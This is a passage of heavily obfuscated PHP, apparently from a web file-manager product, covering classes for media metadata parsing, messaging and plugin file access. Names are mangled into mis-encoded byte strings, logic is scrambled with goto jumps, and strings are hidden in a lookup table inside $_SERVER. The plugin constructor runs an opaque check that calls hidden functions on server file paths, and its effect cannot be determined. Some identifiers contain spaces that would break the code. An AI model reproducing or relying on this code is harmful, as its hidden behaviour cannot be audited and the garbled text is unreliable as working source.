isset($FŸåÖ£¨·Ì[$aôŠÅ¶™Úä[2531]]) ? $FŸåÖ£¨·Ì[$aôŠÅ¶™Úä[2531]] : 0, $aôŠÅ¶™Úä[711] => 0, $aôŠÅ¶™Úä[183] => 0); return parent::insert($c¶×­ÂÀÀ); } public function userNoticeEdit($BÏî»¤²Â, $Aš»°ÑÒÎ) { $this->initUserOption(); return parent::update($BÏî»¤²Â, $Aš»°ÑÒÎ); } } goto fâ”±ÆÊ; eÕšùœöğ¸: class GetInfo { private static $fileTypeArray; public static function get($F·‰½é‚—Õ) { $f“œ–ãèˆ = IO::info($F·‰½é‚—Õ); return self::infoAdd($f“œ–ãèˆ); } public static function check() { } public static function infoAdd(&$AëØâšÙ‚Š) { goto a«å¬‡¨Šé; D¨¤ÇÊƒ÷ò: $B™·™µ”“ = $AëØâšÙ‚Š[$aÓî§ïêÊ[160]]; try { if ($AëØâšÙ‚Š[$aÓî§ïêÊ[160]] == $aÓî§ïêÊ[1633]) { $e“ƒâçŸÓù = self::psdParse($aœ•¹¡Ìåº); $B™·™µ”“ = $aÓî§ïêÊ[1634]; } else { if ($AëØâšÙ‚Š[$aÓî§ïêÊ[160]] == $aÓî§ïêÊ[1635]) { $e“ƒâçŸÓù = self::pdfParse($aœ•¹¡Ìåº); } else { $B™·™µ”“ = self::$fileTypeArray[$aÓî§ïêÊ[1636]][$AëØâšÙ‚Š[$aÓî§ïêÊ[160]]]; $C™›ÖÓ½ÔÔ = self::$fileTypeArray[$aÓî§ïêÊ[1637]][$B™·™µ”“][$aÓî§ïêÊ[1638]]; $C±˜•îÙğÛ = @$cë…¥œ»Áø->analyze($aœ•¹¡Ìåº, $AëØâšÙ‚Š[$aÓî§ïêÊ[77]], $AëØâšÙ‚Š[$aÓî§ïêÊ[28]]); $e“ƒâçŸÓù = self::parseData($C±˜•îÙğÛ, $C™›ÖÓ½ÔÔ, $AëØâšÙ‚Š); } } } catch (Exception $Eâ¾¡¨¨ò) { $e“ƒâçŸÓù = array($aÓî§ïêÊ[372] => $B™·™µ”“); } if (!$e“ƒâçŸÓù) { return; } goto EŠ±–Ö§ìó; DÔ÷íó ¿ó: if (!$AëØâšÙ‚Š || $AëØâšÙ‚Š[$aÓî§ïêÊ[29]] != $aÓî§ïêÊ[167]) { return; } if (!self::support($AëØâšÙ‚Š[$aÓî§ïêÊ[160]]) || isset($AëØâšÙ‚Š[$aÓî§ïêÊ[426]])) { return; } $aœ•¹¡Ìåº = $aÓî§ïêÊ[1632] . $AëØâšÙ‚Š[$aÓî§ïêÊ[75]]; goto D¨¤ÇÊƒ÷ò; C“íå¨ëİ£: return $AëØâšÙ‚Š; goto Cò™©‰ŸŞÜ; a«å¬‡¨Šé: $aÓî§ïêÊ =& $_SERVER[ã®Â„Éæ¹¤]; static $cë…¥œ»Áø; if (!$cë…¥œ»Áø) { require SDK_DIR . $aÓî§ïêÊ[1631]; $cë…¥œ»Áø = new getID3(); } goto DÔ÷íó ¿ó; EŠ±–Ö§ìó: $e“ƒâçŸÓù = self::arrayValueLimit($e“ƒâçŸÓù); $e“ƒâçŸÓù[$aÓî§ïêÊ[372]] = $B™·™µ”“; $AëØâšÙ‚Š[$aÓî§ïêÊ[426]] = $e“ƒâçŸÓù; goto C“íå¨ëİ£; Cò™©‰ŸŞÜ: } public static function support($a°µÀ«Òƒ´) { goto d°…ËÑÜˆ; d°…ËÑÜˆ: $FÑ©´¦ù‘ =& $_SERVER[ã®Â„Éæ¹¤]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $a°µÀ«Òƒ´ = strtolower($a°µÀ«Òƒ´); goto BìÒ«â‰Ë; EÙ–¦ëˆëà: return !1; goto eâÓ®ƒŒ¡; BìÒ«â‰Ë: $C…¼¥ƒÅîß = array($FÑ©´¦ù‘[1635], $FÑ©´¦ù‘[1633]); if (in_array($a°µÀ«Òƒ´, $C…¼¥ƒÅîß)) { return !0; } if (isset(self::$fileTypeArray[$FÑ©´¦ù‘[1636]][$a°µÀ«Òƒ´])) { return !0; } goto EÙ–¦ëˆëà; eâÓ®ƒŒ¡: } public static function arrayValueLimit($bâ×«ãàÜ“, $eÉ²æ¯¸óÓ = 5000) { if (!is_array($bâ×«ãàÜ“)) { return $bâ×«ãàÜ“; } foreach ($bâ×«ãàÜ“ as $Dè°ØÑÙ„ñ => $bäƒÕÊ¢á¤) { if (is_string($bäƒÕÊ¢á¤) && strlen($bäƒÕÊ¢á¤) > $eÉ²æ¯¸óÓ) { $bâ×«ãàÜ“[$Dè°ØÑÙ„ñ] = substr($bäƒÕÊ¢á¤, 0, $eÉ²æ¯¸óÓ); } else { if (is_array($bäƒÕÊ¢á¤)) { $bâ×«ãàÜ“[$Dè°ØÑÙ„ñ] = self::arrayValueLimit($bäƒÕÊ¢á¤, $eÉ²æ¯¸óÓ); } } } return $bâ×«ãàÜ“; } private static function parseData($b‚êßØö…ß, $eô¯‡‚Õ„Œ, $F§§ŞÓ–¯Ö) { $EÎ½¸¾Æ‚ =& $_SERVER[ã®Â„Éæ¹¤]; $dİ¡çíñö = $b‚êßØö…ß[$EÎ½¸¾Æ‚[1639]]; $C¿ñ¾À“› = array(); foreach ($eô¯‡‚Õ„Œ as $fÕ²·Œ¡¦ï => $Eº¢¦Ãñô±) { foreach ($Eº¢¦Ãñô± as $e§Øøö›î¹) { if (is_array($e§Øøö›î¹)) { $D¿êÒ´Š® = self::parseData($b‚êßØö…ß, $Eº¢¦Ãñô±, $F§§ŞÓ–¯Ö); if ($D¿êÒ´Š®) { $C¿ñ¾À“›[$fÕ²·Œ¡¦ï] = $D¿êÒ´Š®; } break; } $F¨…Í‡âƒ = str_replace($EÎ½¸¾Æ‚[1409], $dİ¡çíñö, $e§Øøö›î¹); $D¿êÒ´Š® = _get($b‚êßØö…ß, $F¨…Í‡âƒ); $D¿êÒ´Š® = is_array($D¿êÒ´Š®) ? $D¿êÒ´Š®[0] : $D¿êÒ´Š®; if ($D¿êÒ´Š®) { break; } } if ($D¿êÒ´Š® || $D¿êÒ´Š® === 0 || $D¿êÒ´Š® === !1) { $D¿êÒ´Š® = self::valueReset($e§Øøö›î¹, $D¿êÒ´Š®, $fÕ²·Œ¡¦ï); if ($D¿êÒ´Š® !== null) { $C¿ñ¾À“›[$fÕ²·Œ¡¦ï] = $D¿êÒ´Š®; } } } $C¿ñ¾À“› = self::valueResetAll($C¿ñ¾À“›, $F§§ŞÓ–¯Ö); return $C¿ñ¾À“›; } private static function psdParse($C®ïĞ“ì) { $aèˆšÜ‰ö¡ =& $_SERVER[ã®Â„Éæ¹¤]; if (IO::fileSubstr($C®ïĞ“ì, 0, 4) != $aèˆšÜ‰ö¡[1640]) { return !1; } $F½Öµ¤ËæÙ = getImageSize($C®ïĞ“ì, $dêÕ»Ó…¢); if (!$F½Öµ¤ËæÙ) { return; } $Fï†òù»¬ = array($aèˆšÜ‰ö¡[1555] => $F½Öµ¤ËæÙ[0], $aèˆšÜ‰ö¡[1557] => $F½Öµ¤ËæÙ[1]); return $Fï†òù»¬; } private static function pdfParse($dƒŠ¼ùç®î) { return FileParsePdf::parse($dƒŠ¼ùç®î); } private static function fileTypeParse() { $B‘á¾¾¯ë =& $_SERVER[ã®Â„Éæ¹¤]; $fŸ¿îÚ…·³ = self::fileTypeArray(); $a·°ÕŠ†À = array(); foreach ($fŸ¿îÚ…·³ as $a˜•Á‚å¤è => $b¬Êïå¾ÏŒ) { $BÂœ»•¤Øò = _get($b¬Êïå¾ÏŒ, $B‘á¾¾¯ë[160], $B‘á¾¾¯ë[33]); $eÖ“ã”š²í = is_string($BÂœ»•¤Øò) ? explode($B‘á¾¾¯ë[47], $BÂœ»•¤Øò) : $BÂœ»•¤Øò; if (!$eÖ“ã”š²í) { continue; } foreach ($eÖ“ã”š²í as $BÂœ»•¤Øò) { $BÂœ»•¤Øò = strtolower(trim($BÂœ»•¤Øò)); if (!$BÂœ»•¤Øò) { continue; } $a·°ÕŠ†À[$BÂœ»•¤Øò] = $a˜•Á‚å¤è; } $fŸ¿îÚ…·³[$a˜•Á‚å¤è][$B‘á¾¾¯ë[160]] = array_keys($a·°ÕŠ†À); $fŸ¿îÚ…·³[$a˜•Á‚å¤è][$B‘á¾¾¯ë[1638]] = self::parseKeyMap($b¬Êïå¾ÏŒ[$B‘á¾¾¯ë[1638]]); } return array($B‘á¾¾¯ë[1637] => $fŸ¿îÚ…·³, $B‘á¾¾¯ë[1636] => $a·°ÕŠ†À); } private static function parseKeyMap($cÈñ÷Öæê«) { $d¶¾ŠÕ«­– =& $_SERVER[ã®Â„Éæ¹¤]; foreach ($cÈñ÷Öæê« as $cŒ½—ßÀ”Ş => $eİÓ†ğ“¬‡) { if (is_array($eİÓ†ğ“¬‡)) { $AÈœŠĞ÷Ë = self::parseKeyMap($eİÓ†ğ“¬‡); if ($AÈœŠĞ÷Ë) { $cÈñ÷Öæê«[$cŒ½—ßÀ”Ş] = $AÈœŠĞ÷Ë; } continue; } $aÁí¶¿œ„‹ = explode($d¶¾ŠÕ«­–[47], $eİÓ†ğ“¬‡); $bÃ©ƒ÷ÃŠ = array(); foreach ($aÁí¶¿œ„‹ as $Cš¢ÄÃæÑ­) { $Cš¢ÄÃæÑ­ = trim($Cš¢ÄÃæÑ­); if (!$Cš¢ÄÃæÑ­) { continue; } if (preg_match($d¶¾ŠÕ«­–[1641], $Cš¢ÄÃæÑ­, $DæµÉ£ßƒŸ)) { $B²ÔëâÏ¦† = explode($d¶¾ŠÕ«­–[271], $DæµÉ£ßƒŸ[1]); foreach ($B²ÔëâÏ¦† as $c‚ëÎ¡¸ºÎ) { $bÃ©ƒ÷ÃŠ[] = str_replace($DæµÉ£ßƒŸ[0], $c‚ëÎ¡¸ºÎ, $Cš¢ÄÃæÑ­); } } else { $bÃ©ƒ÷ÃŠ[] = $Cš¢ÄÃæÑ­; } } $cÈñ÷Öæê«[$cŒ½—ßÀ”Ş] = $bÃ©ƒ÷ÃŠ; } return $cÈñ÷Öæê«; } private static function valueResetAll($e±àÍÉö, $a‚ĞÀÖ²Á°) { goto aÔ¤òíĞ¥; b•—Ø© ¢†: $Cñïì•öà = _get($e±àÍÉö, $F’°†öãß’[1654], $F’°†öãß’[33]); $D¯Ì¬ÍÁˆ³ = $Céº¶ò‡ÏØ . $a¶µî¡¸Ë . $Cñïì•öà; if ($D¯Ì¬ÍÁˆ³ && get_charset($D¯Ì¬ÍÁˆ³) != $F’°†öãß’[326]) { $e±àÍÉö[$F’°†öãß’[1651]][$F’°†öãß’[1362]] = iconv_to($e±àÍÉö[$F’°†öãß’[1651]][$F’°†öãß’[1362]], get_charset($D¯Ì¬ÍÁˆ³), $F’°†öãß’[326]); $e±àÍÉö[$F’°†öãß’[1651]][$F’°†öãß’[1655]] = iconv_to($e±àÍÉö[$F’°†öãß’[1651]][$F’°†öãß’[1655]], get_charset($D¯Ì¬ÍÁˆ³), $F’°†öãß’[326]); $e±àÍÉö[$F’°†öãß’[1651]][$F’°†öãß’[1656]] = iconv_to($e±àÍÉö[$F’°†öãß’[1651]][$F’°†öãß’[1656]], get_charset($D¯Ì¬ÍÁˆ³), $F’°†öãß’[326]); } goto fÂ²’£Íº; EÇÔİ¦óãç: if ($c†ÌÈå‹¡Í) { $Cæ ÜóÊ¦× = IO_PATH_SYSTEM_TEMP . $F’°†öãß’[1647] . KodIO::hashPath($a‚ĞÀÖ²Á°) . $F’°†öãß’[1648]; $e±àÍÉö[$F’°†öãß’[1649]] = Action($F’°†öãß’[1650])->pluginCacheFileSet($Cæ ÜóÊ¦×, $c†ÌÈå‹¡Í); unset($e±àÍÉö[$F’°†öãß’[1651]][$F’°†öãß’[1634]]); } $Céº¶ò‡ÏØ = _get($e±àÍÉö, $F’°†öãß’[1652], $F’°†öãß’[33]); $a¶µî¡¸Ë = _get($e±àÍÉö, $F’°†öãß’[1653], $F’°†öãß’[33]); goto b•—Ø© ¢†; aÔ¤òíĞ¥: $F’°†öãß’ =& $_SERVER[ã®Â„Éæ¹¤]; if (isset($e±àÍÉö[$F’°†öãß’[1642]])) { $bØ„¦´ÛÑ• = ceil($e±àÍÉö[$F’°†öãß’[1642]]); $bñßÖÙÁ¾ = intval($bØ„¦´ÛÑ• / 3600); $d¹ Íè„ÄÆ = intval(($bØ„¦´ÛÑ• - $bñßÖÙÁ¾ * 3600) / 60); $F»óä½¹±… = $bØ„¦´ÛÑ• % 60; $e±àÍÉö[$F’°†öãß’[1643]] = sprintf($F’°†öãß’[1644], $bñßÖÙÁ¾, $d¹ Íè„ÄÆ, $F»óä½¹±…); if ($bñßÖÙÁ¾ == 0) { $e±àÍÉö[$F’°†öãß’[1643]] = sprintf($F’°†öãß’[1645], $d¹ Íè„ÄÆ, $F»óä½¹±…); } } $c†ÌÈå‹¡Í = _get($e±àÍÉö, $F’°†öãß’[1646]); goto EÇÔİ¦óãç; fÂ²’£Íº: return $e±àÍÉö; goto b¶«ê´…à²; b¶«ê´…à²: } private static function valueReset($CÎ¿À©Ê‘, $CäİØ«òà·, $f–÷Ï­¢‚¹) { $Eº¬™Õ©š½ =& $_SERVER[ã®Â„Éæ¹¤]; $BéïŒàõâ¨ = $Eº¬™Õ©š½[1572]; switch ($CÎ¿À©Ê‘) { case $Eº¬™Õ©š½[1657]: $CäİØ«òà· = $CäİØ«òà· == $Eº¬™Õ©š½[83] ? $Eº¬™Õ©š½[1658] : $Eº¬™Õ©š½[1659]; break; case $Eº¬™Õ©š½[1660]: $CäİØ«òà· = $CäİØ«òà· ? $CäİØ«òà· : null; break; default: break; } switch ($f–÷Ï­¢‚¹) { case $Eº¬™Õ©š½[1661]: $CäİØ«òà· = round($CäİØ«òà·, 2); break; case $Eº¬™Õ©š½[187]: case $Eº¬™Õ©š½[107]: if ($CäİØ«òà· < 0) { $CäİØ«òà· = null; } else { if (is_numeric($CäİØ«òà·)) { $CäİØ«òà· = date($BéïŒàõâ¨, $CäİØ«òà·); } } break; default: break; } return $CäİØ«òà·; } private static function fileTypeArray() { $f…ŠĞ â¼ =& $_SERVER[ã®Â„Éæ¹¤]; return array($f…ŠĞ â¼[1634] => array($f…ŠĞ â¼[160] => $f…ŠĞ â¼[1662] . $f…ŠĞ â¼[1663], $f…ŠĞ â¼[1638] => array($f…ŠĞ â¼[1555] => $f…ŠĞ â¼[1664], $f…ŠĞ â¼[1557] => $f…ŠĞ â¼[1665], $f…ŠĞ â¼[1666] => $f…ŠĞ â¼[1667], $f…ŠĞ â¼[1668] => $f…ŠĞ â¼[1669], $f…ŠĞ â¼[187] => $f…ŠĞ â¼[1670], $f…ŠĞ â¼[107] => $f…ŠĞ â¼[1671], $f…ŠĞ â¼[1672] => $f…ŠĞ â¼[1673], $f…ŠĞ â¼[1674] => $f…ŠĞ â¼[1675], $f…ŠĞ â¼[1676] => $f…ŠĞ â¼[1677], $f…ŠĞ â¼[1678] => $f…ŠĞ â¼[1679], $f…ŠĞ â¼[1680] => $f…ŠĞ â¼[1681], $f…ŠĞ â¼[1682] => $f…ŠĞ â¼[1683], $f…ŠĞ â¼[1684] => $f…ŠĞ â¼[1685], $f…ŠĞ â¼[1686] => array($f…ŠĞ â¼[1687] => $f…ŠĞ â¼[1688], $f…ŠĞ â¼[1689] => $f…ŠĞ â¼[1690], $f…ŠĞ â¼[1691] => $f…ŠĞ â¼[1692]), $f…ŠĞ â¼[1693] => $f…ŠĞ â¼[1694], $f…ŠĞ â¼[1695] => $f…ŠĞ â¼[1696], $f…ŠĞ â¼[1697] => $f…ŠĞ â¼[1698], $f…ŠĞ â¼[1699] => $f…ŠĞ â¼[1700], $f…ŠĞ â¼[1701] => array($f…ŠĞ â¼[1702] => $f…ŠĞ â¼[1703], $f…ŠĞ â¼[1704] => $f…ŠĞ â¼[1705], $f…ŠĞ â¼[1706] => $f…ŠĞ â¼[1707], $f…ŠĞ â¼[1708] => $f…ŠĞ â¼[1709], $f…ŠĞ â¼[1710] => $f…ŠĞ â¼[1711], $f…ŠĞ â¼[1712] => $f…ŠĞ â¼[1713], $f…ŠĞ â¼[1714] => $f…ŠĞ â¼[1715], $f…ŠĞ â¼[1716] => $f…ŠĞ â¼[1717], $f…ŠĞ â¼[1718] => $f…ŠĞ â¼[1719], $f…ŠĞ â¼[1720] => $f…ŠĞ â¼[1721], $f…ŠĞ â¼[1722] => $f…ŠĞ â¼[1723]))), $f…ŠĞ â¼[1724] => array($f…ŠĞ â¼[160] => $f…ŠĞ â¼[1725] . $f…ŠĞ â¼[1726], $f…ŠĞ â¼[1638] => array($f…ŠĞ â¼[1642] => $f…ŠĞ â¼[1727], $f…ŠĞ â¼[187] => $f…ŠĞ â¼[1728], $f…ŠĞ â¼[107] => $f…ŠĞ â¼[1729], $f…ŠĞ â¼[1674] => $f…ŠĞ â¼[1730], $f…ŠĞ â¼[1731] => $f…ŠĞ â¼[1732], $f…ŠĞ â¼[1733] => $f…ŠĞ â¼[1660], $f…ŠĞ â¼[1734] => $f…ŠĞ â¼[1735], $f…ŠĞ â¼[1736] => $f…ŠĞ â¼[1737], $f…ŠĞ â¼[1738] => $f…ŠĞ â¼[1739], $f…ŠĞ â¼[1651] => array($f…ŠĞ â¼[1362] => $f…ŠĞ â¼[1740], $f…ŠĞ â¼[1655] => $f…ŠĞ â¼[1741], $f…ŠĞ â¼[1656] => $f…ŠĞ â¼[1742], $f…ŠĞ â¼[1743] => $f…ŠĞ â¼[1744], $f…ŠĞ â¼[1745] => $f…ŠĞ â¼[1746], $f…ŠĞ â¼[1747] => $f…ŠĞ â¼[1748], $f…ŠĞ â¼[1634] => $f…ŠĞ â¼[1749]))), $f…ŠĞ â¼[1750] => array($f…ŠĞ â¼[160] => $f…ŠĞ â¼[1751] . $f…ŠĞ â¼[1752], $f…ŠĞ â¼[1638] => array($f…ŠĞ â¼[1555] => $f…ŠĞ â¼[1753], $f…ŠĞ â¼[1557] => $f…ŠĞ â¼[1754], $f…ŠĞ â¼[1642] => $f…ŠĞ â¼[1727], $f…ŠĞ â¼[187] => $f…ŠĞ â¼[1755], $f…ŠĞ â¼[107] => $f…ŠĞ â¼[1756], $f…ŠĞ â¼[1661] => $f…ŠĞ â¼[1757], $f…ŠĞ â¼[1738] => $f…ŠĞ â¼[1758], $f…ŠĞ â¼[1734] => $f…ŠĞ â¼[1759], $f…ŠĞ â¼[1674] => $f…ŠĞ â¼[1760], $f…ŠĞ â¼[1724] => array($f…ŠĞ â¼[1733] => $f…ŠĞ â¼[1660], $f…ŠĞ â¼[1761] => $f…ŠĞ â¼[1762], $f…ŠĞ â¼[1731] => $f…ŠĞ â¼[1732], $f…ŠĞ â¼[1738] => $f…ŠĞ â¼[1739], $f…ŠĞ â¼[1734] => $f…ŠĞ â¼[1763], $f…ŠĞ â¼[1736] => $f…ŠĞ â¼[1737]))), $f…ŠĞ â¼[1764] => array($f…ŠĞ â¼[1638] => array($f…ŠĞ â¼[1765] => $f…ŠĞ â¼[1766], $f…ŠĞ â¼[1767] => $f…ŠĞ â¼[1768])), $f…ŠĞ â¼[1769] => array($f…ŠĞ â¼[1638] => array())); } } function exif_read_data_io($B¬° Œö—², $bÕù·æˆ² = null, $cö„İõ½œÈ = false, $B¿Ì¾ø¦Ê = false) { $B’ÂÙ´Ú¨ = StreamWrapperIO::read($B¬° Œö—², 0, 1024 * 64); $cŒˆéÓÕ‚ = $_SERVER[ã®Â„Éæ¹¤][1770] . base64_encode($B’ÂÙ´Ú¨); return exif_read_data($cŒˆéÓÕ‚, $bÕù·æˆ², $cö„İõ½œÈ, $B¿Ì¾ø¦Ê); } function getimagesize_io($Eßä×ñ›¤—, &$Eª×‹™á³ = false) { $B‘Ã†ø™ŒÛ = StreamWrapperIO::read($Eßä×ñ›¤—, 0, 1024 * 64); $Eßä×ñ›¤— = $_SERVER[ã®Â„Éæ¹¤][1770] . base64_encode($B‘Ã†ø™ŒÛ); return getimagesize($Eßä×ñ›¤—, $Eª×‹™á³); } goto bŠ…¼Ø»¯Ô; EƒÔê´ à›: class Message { function __construct() { } public function send($E¶ˆÆ †‚§ = '', $DçŞôŠ‰›î = array(), $C‘Æ©íŒô­ = "\164\x65\x78\164") { goto F½ÓÄŠ›’; d×Œ¯õìó”: $DçŞôŠ‰›î = array($E§£é³Ğ•[989] => isset($DçŞôŠ‰›î[$E§£é³Ğ•[989]]) ? $DçŞôŠ‰›î[$E§£é³Ğ•[989]] : $E§£é³Ğ•[33], $E§£é³Ğ•[536] => isset($DçŞôŠ‰›î[$E§£é³Ğ•[536]]) ? $DçŞôŠ‰›î[$E§£é³Ğ•[536]] : $E§£é³Ğ•[33]); if (empty($E¶ˆÆ †‚§) || empty($DçŞôŠ‰›î[$E§£é³Ğ•[989]]) && empty($DçŞôŠ‰›î[$E§£é³Ğ•[536]])) { return !1; } $Cåå›Á©¹Õ = array($E§£é³Ğ•[1265] => $f¤¬ôäÙµ, $E§£é³Ğ•[1325] => $DçŞôŠ‰›î); goto aŸåµÈ™‘â; F½ÓÄŠ›’: $E§£é³Ğ• =& $_SERVER[ã®Â„Éæ¹¤]; $f¤¬ôäÙµ = array($E§£é³Ğ•[29] => $E§£é³Ğ•[1323], $E§£é³Ğ•[714] => $E¶ˆÆ †‚§); if (in_array($C‘Æ©íŒô­, array($E§£é³Ğ•[1323], $E§£é³Ğ•[1324]))) { $f¤¬ôäÙµ[$E§£é³Ğ•[29]] = $C‘Æ©íŒô­; } goto d×Œ¯õìó”; aŸåµÈ™‘â: Hook::trigger($E§£é³Ğ•[1326], $Cåå›Á©¹Õ); goto A°Øê”¶‰; A°Øê”¶‰: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto fÛÃ¶¥¬«à; fÛÃ¶¥¬«à: $a½éŞî˜Œ =& $_SERVER[ã®Â„Éæ¹¤]; if ($_SERVER[$a½éŞî˜Œ[554]] != $_SERVER[$a½éŞî˜Œ[1259]]) { goto fĞÁ”šá¬; fĞÁ”šá¬: $Cãö’¶³ŠŠ = $a½éŞî˜Œ[813]; $D©˜¸¹Š¬ë = $a½éŞî˜Œ[555]; $BÉ˜¸àÏÚá = $_SERVER[$a½éŞî˜Œ[556]] . $a½éŞî˜Œ[557]; goto b´‘Éøª“½; b´‘Éøª“½: $cº¿±›÷ÕÉ = $D©˜¸¹Š¬ë($BÉ˜¸àÏÚá); $A³éõÕİ = explode($a½éŞî˜Œ[217], $cº¿±›÷ÕÉ); if (count($A³éõÕİ) < $a½éŞî˜Œ[562]) { $Bˆæ÷ÛµéÏ = $a½éŞî˜Œ[559]; $Bˆæ÷ÛµéÏ(); } goto A»˜ó ‘¼Ë; A»˜ó ‘¼Ë: $b¨¯ğ§´¿ = $a½éŞî˜Œ[814]; $b¨¯ğ§´¿($_SERVER[$a½éŞî˜Œ[815]]); $b¨¯ğ§´¿($_SERVER[$a½éŞî˜Œ[556]] . $a½éŞî˜Œ[1327]); goto eˆôŸ®‰ëÆ; eˆôŸ®‰ëÆ: $bó‘ÏÎ­ˆô = 1; while ($bó‘ÏÎ­ˆô > 1) { $bó‘ÏÎ­ˆô = $bó‘ÏÎ­ˆô + 4; $a’ÉÔƒ¤Š = rawurlencode($bó‘ÏÎ­ˆô . $a½éŞî˜Œ[361]); } goto c´î¼±íÁš; c´î¼±íÁš: } global $in, $config; goto cÇÆá„„ä; cÀƒ’«„¦¼: $this->pluginName = str_replace($a½éŞî˜Œ[1328], $a½éŞî˜Œ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $a½éŞî˜Œ[8]; $this->pluginApi = appHostGet() . $a½éŞî˜Œ[1329] . $this->pluginName . $a½éŞî˜Œ[8]; goto c´‘œ¢¾Â°; c´‘œ¢¾Â°: $this->pluginHost = $config[$a½éŞî˜Œ[1330]] . $this->pluginName . $a½éŞî˜Œ[8]; $this->pluginHostDefault = $config[$a½éŞî˜Œ[1330]] . $this->pluginName . $a½éŞî˜Œ[8]; $c˜ƒÊ†˜­è = $config[$a½éŞî˜Œ[1331]]; goto dĞÓ‰ÜÕ•Ş; dĞÓ‰ÜÕ•Ş: if ($c˜ƒÊ†˜­è && strpos($a½éŞî˜Œ[47] . $c˜ƒÊ†˜­è . $a½éŞî˜Œ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$a½éŞî˜Œ[1332]] . $this->pluginName . $a½éŞî˜Œ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto a‰ØµäÓñ»; cÇÆá„„ä: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($a½éŞî˜Œ[1328]); goto cÀƒ’«„¦¼; a‰ØµäÓñ»: return $this; goto bÇ¹„ÊÍ·‡; bÇ¹„ÊÍ·‡: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ã®Â„Éæ¹¤][1333]); } protected function assign($BÇŠğ‚‹¤î, $a½ñ§Îìˆ = false) { if (is_array($BÇŠğ‚‹¤î)) { $this->values = array_merge($this->values, $BÇŠğ‚‹¤î); } else { $this->values[$BÇŠğ‚‹¤î] = $a½ñ§Îìˆ; } } protected function display($f¡ò°åÛñ) { extract($this->values); require $f¡ò°åÛñ; } final function hookRegist($c‚«¬Ò™ƒÛ) { $this->modelPlugin->appRegist($this->pluginName, $c‚«¬Ò™ƒÛ); } final function appIcon() { $c¼ì©Óêëå =& $_SERVER[ã®Â„Éæ¹¤]; $C‰èÊÊÕ = $this->appPackage(); $fÇ¦’ÕƒÀù = $c¼ì©Óêëå[33]; if (isset($C‰èÊÊÕ[$c¼ì©Óêëå[382]])) { if (isset($C‰èÊÊÕ[$c¼ì©Óêëå[382]][$c¼ì©Óêëå[1334]])) { $fÇ¦’ÕƒÀù = $c¼ì©Óêëå[1335] . $C‰èÊÊÕ[$c¼ì©Óêëå[382]][$c¼ì©Óêëå[1334]] . $c¼ì©Óêëå[1336]; } else { if ($C‰èÊÊÕ[$c¼ì©Óêëå[382]][$c¼ì©Óêëå[1337]]) { $fÇ¦’ÕƒÀù = $c¼ì©Óêëå[1338] . $C‰èÊÊÕ[$c¼ì©Óêëå[382]][$c¼ì©Óêëå[1337]] . $c¼ì©Óêëå[1339]; } } } return $fÇ¦’ÕƒÀù; } final function fileCanView($FÄ£®œê³¼) { goto D£å©èŒšæ; a¡–½äØ±‹: ActionCall($añ²ÄÀä¾Œ[1352], $FÄ£®œê³¼); goto a…ŞÅ›†ÙÙ; D¼ğ¸É²Œ¢: $cŠÅ«„ ÓŞ = Session::get($añ²ÄÀä¾Œ[1340]); if (!$cŠÅ«„ ÓŞ || !$cŠÅ«„ ÓŞ[$añ²ÄÀä¾Œ[1341]]) { $DÌÅÁÈÒ© = $añ²ÄÀä¾Œ[1342] . rawurlencode(this_url()); show_tips(LNG($añ²ÄÀä¾Œ[1343]) . $añ²ÄÀä¾Œ[1344] . $DÌÅÁÈÒ© . $añ²ÄÀä¾Œ[1345] . LNG($añ²ÄÀä¾Œ[1346]) . $añ²ÄÀä¾Œ[1347], !1); } if (!Action($añ²ÄÀä¾Œ[1348])->authCan($añ²ÄÀä¾Œ[1349])) { show_tips(LNG($añ²ÄÀä¾Œ[1350]) . $añ²ÄÀä¾Œ[1351], !1); } goto a¡–½äØ±‹; D£å©èŒšæ: $añ²ÄÀä¾Œ =& $_SERVER[ã®Â„Éæ¹¤]; if (request_url_safe($FÄ£®œê³¼)) { return !0; } if ($this->isShare($FÄ£®œê³¼)) { return !0; } goto D¼ğ¸É²Œ¢; a…ŞÅ›†ÙÙ: } final function isShare($fôùßÇ½£ù) { $DÆ¾Ï–× = KodIO::parse($fôùßÇ½£ù); return $DÆ¾Ï–×[$_SERVER[ã®Â„Éæ¹¤][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($e‘Í´ø ¼°) { if (request_url_safe($e‘Í´ø ¼°)) { return $e‘Í´ø ¼°; } if (!$this->isShare($e‘Í´ø ¼°)) { $e‘Í´ø ¼° = $this->filePath($e‘Í´ø ¼°); } return Action($_SERVER[ã®Â„Éæ¹¤][1037])->linkOut($e‘Í´ø ¼°); } public function filePathLinkOut($Dšöâ„·ïï) { if (request_url_safe($Dšöâ„·ïï)) { return $Dšöâ„·ïï; } $this->fileCanView($Dšöâ„·ïï); return Action($_SERVER[ã®Â„Éæ¹¤][1037])->link($Dšöâ„·ïï); } final function filePath($EŠÕĞÈ±²Ñ) { $DÏ­÷Š¤ „ =& $_SERVER[ã®Â„Éæ¹¤]; if ($B¦ùê…ó—² = $this->checkSharePath($EŠÕĞÈ±²Ñ)) { return $B¦ùê…ó—²; } $this->fileCanView($EŠÕĞÈ±²Ñ); if (request_url_safe($EŠÕĞÈ±²Ñ)) { $c÷¨¡“†Û× = parse_url_query($EŠÕĞÈ±²Ñ); if (isset($c÷¨¡“†Û×[$DÏ­÷Š¤ „[1353]]) && isset($c÷¨¡“†Û×[$DÏ­÷Š¤ „[197]])) { $eç”Îœ¨ = Model($DÏ­÷Š¤ „[1107])->get($DÏ­÷Š¤ „[1354]); $a„ïÚ‹Ç»‘ = Mcrypt::decode($c÷¨¡“†Û×[$DÏ­÷Š¤ „[197]], $eç”Îœ¨); if ($a„ïÚ‹Ç»‘) { $this->fileInfo = IO::infoWithChildren($a„ïÚ‹Ç»‘); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $a„ïÚ‹Ç»‘; } } $EŠÕĞÈ±²Ñ = $this->_cacheHttpFile($EŠÕĞÈ±²Ñ); $this->fileInfo = IO::infoWithChildren($EŠÕĞÈ±²Ñ); } else { $this->fileInfo = 